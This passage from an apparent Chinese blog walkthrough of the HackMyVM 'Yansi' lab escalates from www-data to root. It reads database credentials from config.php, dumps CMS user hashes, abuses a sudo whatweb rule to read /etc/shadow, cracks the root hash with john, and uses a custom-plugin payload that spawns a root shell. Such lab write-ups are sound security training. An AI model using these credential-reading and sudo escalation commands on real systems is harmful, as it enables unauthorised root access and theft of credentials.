src="/2025/06/08/HackMyVM-Yansi/vmware_5kb75XrILC.png"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Yansi:/var/www/html/cmsms$ cat config.php <br>&lt;?php<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">CMS Made Simple Configuration File</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbms&#x27;</span>] = <span class="hljs-string">&#x27;mysqli&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_hostname&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_password&#x27;</span>] = <span class="hljs-string">&#x27;root123&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_name&#x27;</span>] = <span class="hljs-string">&#x27;Test&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_prefix&#x27;</span>] = <span class="hljs-string">&#x27;cms_&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;timezone&#x27;</span>] = <span class="hljs-string">&#x27;UTC&#x27;</span>;</span><br>?&gt;www-data@Yansi:/var/www/html/cmsms$ <br></code></pre></td></tr></table></figure><p>查看config.php，里面有数据库的账号密码，读取到google用户的密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs mysql">www-data@Yansi:/var/www/html/cmsms$ mysql -uroot -proot123<br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection id is 23781<br>Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><br>MariaDB [(none)]&gt; use Test;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [Test]&gt; select * from cms_users ;<br>+---------+----------+----------------------------------+--------------+--------------------+-------------+-----------------+--------+---------------------+---------------------+<br>| user_id | username | password                         | admin_access | first_name         | last_name   | email           | active | create_date         | modified_date       |<br>+---------+----------+----------------------------------+--------------+--------------------+-------------+-----------------+--------+---------------------+---------------------+<br>|       1 | admin    | b8411ccfcf8036d818f0e3e5bbcd24de |            1 |                    |             | admin@admin.com |      1 | 2025-06-08 03:52:15 | 2025-06-08 04:26:41 |<br>|       2 | google   | bc7254fff92665852c30b85b9e812836 |            1 | password:google123 | user:google |                 |      1 | 2025-06-08 04:05:12 | 2025-06-08 04:05:12 |<br>|       3 | demo     | 190359934f28f5eaf4cf315802020a87 |            1 |                    |             |                 |      1 | 2025-06-08 04:07:40 | 2025-06-08 04:07:40 |<br>+---------+----------+----------------------------------+--------------+--------------------+-------------+-----------------+--------+---------------------+---------------------+<br>3 rows in set (0.000 sec)<br><br>MariaDB [Test]&gt; <br><br></code></pre></td></tr></table></figure><p>事实上，直接从web的管理界面上就能看到了，能省不少事。</p><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_uXOOSaqz37.png"></p><p>ssh到google用户上拿到userflag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh google@192.168.56.116<br>The authenticity of host &#x27;192.168.56.116 (192.168.56.116)&#x27; can&#x27;t be established.<br>ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;192.168.56.116&#x27; (ED25519) to the list of known hosts.<br>google@192.168.56.116&#x27;s password: <br>Linux Yansi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sun Jun  8 09:54:03 2025 from 192.168.56.104<br>google@Yansi:~$ ls<br>user.txt<br>google@Yansi:~$ cat user.txt <br>flag&#123;user-e93a188c288106b24060679d47cc630f&#125;<br>google@Yansi:~$ <br><br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">google@Yansi:~$ sudo -l<br>Matching Defaults entries for google on Yansi:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User google may run the following commands on Yansi:<br>    (ALL) NOPASSWD: /usr/bin/whatweb<br>google@Yansi:~$ <br><br></code></pre></td></tr></table></figure><p>sudo -l看一下哪些文件可以执行，发现bin目录下有一个whatweb。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs shell">google@Yansi:/usr/bin$ sudo whatweb -h<br><br>.$$$     $.                                   .$$$     $.<br><span class="hljs-meta prompt_">$</span><span class="language-bash">$$$     $$. .$$$  $$$ .$$$$$$.  .$$$$$$$$$$. $$$$     $$. .$$$$$$$. .$$$$$$.</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">$$     $$$ $ $$  $$$ $ $$$$$$. $$$$$ $$$$$$ $ $$     $$$ $ $$   $$ $ $$$$$$.</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">`$     $$$ $ `$  $$$ $ `$  $$$ $$<span class="hljs-string">&#x27; $ `$ `$$ $ `$     $$$ $ `$      $ `$  $$$&#x27;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">. $     $$$ $. $$$$$$ $. $$$$$$ `$  $. $  :<span class="hljs-string">&#x27; $. $     $$$ $. $$$$   $. $$$$$.</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-string">::$  .  $$$ $::$  $$$ $::$  $$$     $::$     $::$  .  $$$ $::$      $::$  $$$$</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-string">;;$ $$$ $$$ $;;$  $$$ $;;$  $$$     $;;$     $;;$ $$$ $$$ $;;$      $;;$  $$$$</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-string">$$$$$ $$$$$ $$$$  $$$ $$$$  $$$     $$$$     $$$$$$ $$$$$ $$$$$$$$$ $$$$$$$$$&#x27;</span></span><br><br><br>WhatWeb - Next generation web scanner version 0.5.5.<br>Developed by Andrew Horton (urbanadventurer) and Brendan Coles (bcoles).<br>Homepage: https://www.morningstarsecurity.com/research/whatweb<br><br>Usage: whatweb [options] &lt;URLs&gt;<br><br>TARGET SELECTION:<br>  &lt;TARGETs&gt;                     Enter URLs, hostnames, IP addresses, filenames or<br>                                IP ranges in CIDR, x.x.x-x, or x.x.x.x-x.x.x.x<br>                                format.<br>  --input-file=FILE, -i         Read targets from a file. You can pipe<br>                                hostnames or URLs directly with -i /dev/stdin.<br><br>TARGET MODIFICATION:<br>  --url-prefix                  Add a prefix to target URLs.<br>  --url-suffix                  Add a suffix to target URLs.<br>  --url-pattern                 Insert the targets into a URL.<br>                                e.g. example.com/%insert%/robots.txt<br><br>AGGRESSION:<br>The aggression level controls the trade-off between speed/stealth and<br>reliability.<br>  --aggression, -a=LEVEL        Set the aggression level. Default: 1.<br>  1. Stealthy                   Makes one HTTP request per target and also<br>                                follows redirects.<br>  3. Aggressive                 If a level 1 plugin is matched, additional<br>                                requests will be made.<br>  4. Heavy                      Makes a lot of HTTP requests per target. URLs<br>                                from all plugins are attempted.<br><br>HTTP OPTIONS:<br>  --user-agent, -U=AGENT        Identify as AGENT instead of WhatWeb/0.5.5.<br>  --header, -H                  Add an HTTP header. eg &quot;Foo:Bar&quot;. Specifying a<br>                                default header will replace it. Specifying an<br>                                empty value, e.g. &quot;User-Agent:&quot; will remove it.<br>  --follow-redirect=WHEN        Control when to follow redirects. WHEN may be<br>                                `never&#x27;, `http-only&#x27;, `meta-only&#x27;, `same-site&#x27;,<br>                                or `always&#x27;. Default: always.<br>  --max-redirects=NUM           Maximum number of redirects. Default: 10.<br><br>AUTHENTICATION:<br>  --user, -u=&lt;user:password&gt;    HTTP basic authentication.<br>  --cookie, -c=COOKIES          Use cookies, e.g. &#x27;name=value; name2=value2&#x27;.<br>  --cookie-jar=FILE             Read cookies from a file.<br><br>PROXY:<br>  --proxy                       &lt;hostname[:port]&gt; Set proxy hostname and port.<br>                                Default: 8080.<br>  --proxy-user                  &lt;username:password&gt; Set proxy user and password.<br><br>PLUGINS:<br>  --list-plugins, -l            List all plugins.<br>  --info-plugins, -I=[SEARCH]   List all plugins with detailed information.<br>                                Optionally search with keywords in a comma<br>                                delimited list.<br>  --search-plugins=STRING       Search plugins for a keyword.<br>  --plugins, -p=LIST            Select plugins. LIST is a comma delimited set<br>                                of selected plugins. Default is all.<br>                                Each element can be a directory, file or plugin<br>                                name and can optionally have a modifier, +/-.<br>                                Examples: +/tmp/moo.rb,+/tmp/foo.rb<br>                                title,md5,+./plugins-disabled/<br>                                ./plugins-disabled,-md5<br>                                -p + is a shortcut for -p +plugins-disabled.<br>  --grep, -g=STRING|REGEXP      Search for STRING or a Regular Expression. Shows<br>                                only the results that match.<br>                                Examples: --grep &quot;hello&quot;<br>                                --grep &quot;/he[l]*o/&quot;<br>  --custom-plugin=DEFINITION    Define a custom plugin named Custom-Plugin,<br>                                Examples: &quot;:text=&gt;&#x27;powered by abc&#x27;&quot;<br>                                &quot;:version=&gt;/powered[ ]?by ab[0-9]/&quot;<br>                                &quot;:ghdb=&gt;&#x27;intitle:abc \&quot;powered by abc\&quot;&#x27;&quot;<br>                                &quot;:md5=&gt;&#x27;8666257030b94d3bdb46e05945f60b42&#x27;&quot;<br>                                &quot;&#123;:text=&gt;&#x27;powered by abc&#x27;&#125;&quot;<br>  --dorks=PLUGIN                List Google dorks for the selected plugin.<br><br>OUTPUT:<br>  --verbose, -v                 Verbose output includes plugin descriptions.<br>                                Use twice for debugging.<br>  --colour,--color=WHEN         control whether colour is used. WHEN may be<br>                                `never&#x27;, `always&#x27;, or `auto&#x27;.<br>  --quiet, -q                   Do not display brief logging to STDOUT.<br>  --no-errors                   Suppress error messages.<br><br>LOGGING:<br>  --log-brief=FILE              Log brief, one-line output.<br>  --log-verbose=FILE            Log verbose output.<br>  --log-errors=FILE             Log errors.<br>  --log-xml=FILE                Log XML format.<br>  --log-json=FILE               Log JSON format.<br>  --log-sql=FILE                Log SQL INSERT statements.<br>  --log-sql-create=FILE         Create SQL database tables.<br>  --log-json-verbose=FILE       Log JSON Verbose format.<br>  --log-magictree=FILE          Log MagicTree XML format.<br>  --log-object=FILE             Log Ruby object inspection format.<br>  --log-mongo-database          Name of the MongoDB database.<br>  --log-mongo-collection        Name of the MongoDB collection.<br>                                Default: whatweb.<br>  --log-mongo-host              MongoDB hostname or IP address.<br>                                Default: 0.0.0.0.<br>  --log-mongo-username          MongoDB username. Default: nil.<br>  --log-mongo-password          MongoDB password. Default: nil.<br>  --log-elastic-index           Name of the index to store results. Default: whatweb<br>  --log-elastic-host            Host:port of the elastic http interface. Default: 127.0.0.1:9200<br><br>PERFORMANCE &amp; STABILITY:<br>  --max-threads, -t             Number of simultaneous threads. Default: 25.<br>  --open-timeout                Time in seconds. Default: 15.<br>  --read-timeout                Time in seconds. Default: 30.<br>  --wait=SECONDS                Wait SECONDS between connections.<br>                                This is useful when using a single thread.<br><br>HELP &amp; MISCELLANEOUS:<br>  --short-help                  Short usage help.<br>  --help, -h                    Complete usage help.<br>  --debug                       Raise errors in plugins.<br>  --version                     Display version information.<br><br>EXAMPLE USAGE:<br>* Scan example.com.<br>  ./whatweb example.com<br><br>* Scan reddit.com slashdot.org with verbose plugin descriptions.<br>  ./whatweb -v reddit.com slashdot.org<br><br>* An aggressive scan of wired.com detects the exact version of WordPress.<br>  ./whatweb -a 3 www.wired.com<br><br>* Scan the local network quickly and suppress errors.<br>  whatweb --no-errors 192.168.0.0/24<br><br>* Scan the local network for https websites.<br>  whatweb --no-errors --url-prefix https:// 192.168.0.0/24<br><br>* Scan for crossdomain policies in the Alexa Top 1000.<br>  ./whatweb -i plugin-development/alexa-top-100.txt \<br>  --url-suffix /crossdomain.xml -p crossdomain_xml<br><br></code></pre></td></tr></table></figure><p>我们看到可以用i读取文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">google@Yansi:/usr/bin$ sudo whatweb -i /root/root.txt<br>Unable to parse invalid target : Invalid character in host: &#x27;flag&#123;root-594359512f516a5f9c80930b6c388d10&#125;&#x27;<br>No targets selected<br><br></code></pre></td></tr></table></figure><p>但这还不算完，我们还没有拿到root的shell。</p><p>既然可以用i读文件，那自然想到读shadow。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nix">google@Yansi:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>bin$ sudo whatweb <span class="hljs-operator">-</span>i <span class="hljs-symbol">/etc/shadow</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;$6$0Eykzb257cANR9sU$mH05O99a8NTNnSBx6j&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Prepare Target Failed <span class="hljs-operator">-</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>但是读的文件并不全，这时查阅whatweb的文档，发现它还提供了一个执行本地插件的功能，依此我们能利用的点就很多了。</p><p>首先是用plugin读shadow。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error </span>loading plugin /etc/shadow. Error details: /etc/shadow:1: syntax error, unexpected &#x27;:&#x27;, expecting end-of-input<br>root:sbSGfTY5rMGMg:20247:0:99999:7:::                                                                               <br>No plugins selected, exiting.<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# echo &quot;sbSGfTY5rMGMg&quot; &gt; <span class="hljs-number">1.</span>txt                <br>                                                                                                                                                           <br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# john <span class="hljs-number">1.</span>txt <span class="hljs-comment">--wordlist=/home/kali/Desktop/rockyou.txt</span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (descrypt, traditional crypt(<span class="hljs-number">3</span>) [DES <span class="hljs-number">128</span>/<span class="hljs-number">128</span> AVX])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>juicybab         (?)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2025</span><span class="hljs-number">-06</span><span class="hljs-number">-08</span> <span class="hljs-number">11</span>:<span class="hljs-number">08</span>) <span class="hljs-number">33.33</span>g/s <span class="hljs-number">7372</span>Kp/s <span class="hljs-number">7372</span>Kc/s <span class="hljs-number">7372</span>KC/s luckycat..calor<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed. <br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">google<span class="hljs-variable">@Yansi</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-variable">$ </span>su root<br><span class="hljs-symbol">Password:</span> <br>root<span class="hljs-variable">@Yansi</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>成功拿到root的shell。</p><p>还有一种方法是直接利用whatweb的自定义插件功能，起一个bash过去。</p><p>（没写过ruby，这里毛的群友的一句话提权脚本）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">google@Yansi:~$ sudo whatweb --custom-plugin=&quot;&#123;:name=&gt;&#x27;Malicious&#x27;, :version=&gt;//, :string =&gt; (system(&#x27;/bin/sh&#x27;) rescue nil)&#125;&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">id</span></span><br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><p>如果想要正规的写法可以参阅whatweb的文档。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment">##</span><br><span class="hljs-comment"># This file is part of WhatWeb and may be subject to</span><br><span class="hljs-comment"># redistribution and commercial restrictions. Please see the WhatWeb</span><br><span class="hljs-comment"># web site for more information on licensing and terms of use.</span><br><span class="hljs-comment"># https://morningstarsecurity.com/research/whatweb</span><br><span class="hljs-comment">#</span><br>Plugin.define do<br>name <span class="hljs-string">&quot;Plugin-Tutorial-1&quot;</span><br>authors [<br><span class="hljs-string">&quot;Your preferred name &lt;email@address&gt;&quot;</span>, <span class="hljs-comment"># v0.1 # 2019-01-01 # Created plugin</span><br>]<br>version <span class="hljs-string">&quot;0.1&quot;</span><br>description <span class="hljs-string">&quot;Generic CMS is an open-source Content Management System developed in PHP.&quot;</span><br>website <span class="hljs-string">&quot;http://example.com/&quot;</span><br><br><span class="hljs-comment"># This is the matches array. </span><br><span class="hljs-comment"># Each match is treated independently.</span><br><br><span class="hljs-comment"># Matches #</span><br>matches [<br><span class="hljs-comment"># This searches for a text string.</span><br>&#123; <span class="hljs-meta">:text</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">&quot;This page was generated by &lt;b&gt;Generic CMS&lt;/b&gt;&quot;</span> &#125;,<br><br><span class="hljs-comment"># This searches for a regular expression. Note that the slashes are escaped.</span><br>&#123; <span class="hljs-meta">:regexp</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-symbol">/This</span> page was generated by <span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-string">&quot;http:<span class="hljs-char escape_">\/</span><span class="hljs-char escape_">\/</span>www.genericcms.com<span class="hljs-char escape_">\/</span>en<span 